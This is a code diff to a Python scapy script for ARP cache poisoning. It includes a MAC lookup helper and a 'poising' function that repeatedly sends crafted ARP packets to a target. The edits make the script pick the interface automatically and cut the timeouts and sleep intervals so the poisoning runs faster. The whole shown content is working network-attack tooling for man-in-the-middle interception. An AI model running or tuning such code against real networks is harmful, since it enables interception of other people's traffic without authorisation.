@@ -3,13 +3,14 @@ import logging
 import time
 
 from args import argument
+from scapy.config import conf
 from scapy.arch import get_if_hwaddr
 from scapy.layers.inet import Ether
 from scapy.layers.l2 import ARP
 from scapy.sendrecv import srp
 
 
-MY_MAC = get_if_hwaddr('enp7s0')  # NOTE recupere mon MAC de l'interface
+MY_MAC = get_if_hwaddr(conf.iface)  # NOTE recupere mon MAC de l'interface
 
 
 def get_mac(gateway: str = None, target: str = None):
@@ -22,18 +23,18 @@ def get_mac(gateway: str = None, target: str = None):
     Returns:
         str: mac to ip.
     """
-    
+
     pkt = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=gateway)
 
     if target:
         pkt['ARP'].pdst = target
 
-    resp, _ = srp(pkt, timeout=1, verbose=False, retry=10)
+    resp, _ = srp(pkt, timeout=0.05, verbose=False, retry=10)
     for _, r in resp:
         return r.hwsrc
 
 
-def poising(target_mac: str, gateway_ip: str = '192.168.0.1', loop: int = 10, sleep: int | float = 1.51):
+def poising(target_mac: str, gateway_ip: str = '192.168.0.1', loop: int = 10, sleep: int | float = 0.005):
     """Function target arp table poisoning
 
     Args:
@@ -48,7 +49,7 @@ def poising(target_mac: str, gateway_ip: str = '192.168.0.1', loop: int = 10, sl
     pkt.show()
     for _ in range(loop):
         time.sleep(sleep)
-        srp(pkt, timeout=5, verbose=False)
+        srp(pkt, timeout=2, verbose=False)
 
 
 if __name__ == '__main__':
